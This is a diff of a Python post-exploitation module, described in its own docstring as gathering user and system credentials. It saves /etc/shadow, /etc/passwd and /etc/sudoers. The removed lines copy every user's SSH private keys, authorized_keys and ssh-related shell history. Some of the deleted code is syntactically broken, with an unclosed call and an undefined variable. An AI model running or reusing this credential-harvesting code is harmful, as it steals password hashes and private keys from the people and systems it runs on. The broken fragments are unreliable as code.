@@ -3,55 +3,13 @@
 @description: Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
 @author: ohdae [bindshell@live.com]
 '''
-def users():
-    userlist = []
-    if os.access('/etc/passwd', os.R_OK):
-        passwd = open('/etc/passwd')
-        for line in passwd:
-            fields = line.split(':')
-            uid = int(fields[2])
-            if uid > 500 and uid < 32328:
-                userlist.append(fields[0])
-
 
 def get_creds():
-    users()
     save_file('/etc/passwd')
     save_file('/etc/shadow')
     save_file('/etc/sudoers')
-    save_file('/etc/ssh/sshd_config')
-    cmd2txt('lastlog', 'lastlog.txt')
-    cmd2txt('getent aliases', 'mail_aliases.txt')
-
-    if currentuser == "root":
-        cmd2txt('find / -maxdepth 3 -name .ssh', 'ssh_locations.txt')
-
-        for user in userlist:
-            cmd2txt("cat /home/%s/.bash_history | grep ssh" % user, "%s-SSH-History.txt" % user)
-            cmd2txt("cat %s/.bash_history | grep ssh" % home, "Root-SSH-History.txt")
-            cmd2txt("ls /home/%s/.ssh/*" % user, "ssh_%s.txt" % user)
-            save_file("/home/%s/.ssh/id_dsa" % user)
-            save_file("/home/%s/.ssh/id_dsa.pub" % user)
-            save_file("/home/%s/.ssh/id_rsa" % user)
-            save_file("/home/%s/.ssh/id_rsa.pub" % user)
-            save_file("/home/%s/.ssh/authorized_keys" % user)
-            save_file("/home/%s/.ssh/config" % user)
-            save_file("%s/.ssh/id_dsa" % home)
-            save_file("%s/.ssh/id_dsa.pub" % home)
-            save_file("%s/.ssh/id_rsa" % home)
-            save_file("%s/.ssh/id_rsa.pub" % home)
-            save_file("%s/.ssh/authorized_keys" % home)
-            save_file("%s/.ssh/config" % home
-
-    else:
-        cmd2txt("cat /home/%s/.bash_history | grep ssh" % user, "%s-SSH-History.txt" % user)
-        save_file("%s/.ssh/id_dsa" % home)
-        save_file("%s/.ssh/id_dsa.pub" % home)
-        save_file("%s/.ssh/id_rsa" % home)
-        save_file("%s/.ssh/id_rsa.pub" % home)
-        save_file("%s/.ssh/authorized_keys" % home)
-        save_file("%s/.ssh/config" % home)
-        cmd2txt("ls %s/.ssh/*" % home, "ssh_contents.txt")
+    cmd_save('lastlog', 'lastlog.txt')
+    cmd_save('getent aliases', 'mail_aliases.txt')
 
 
 get_creds()
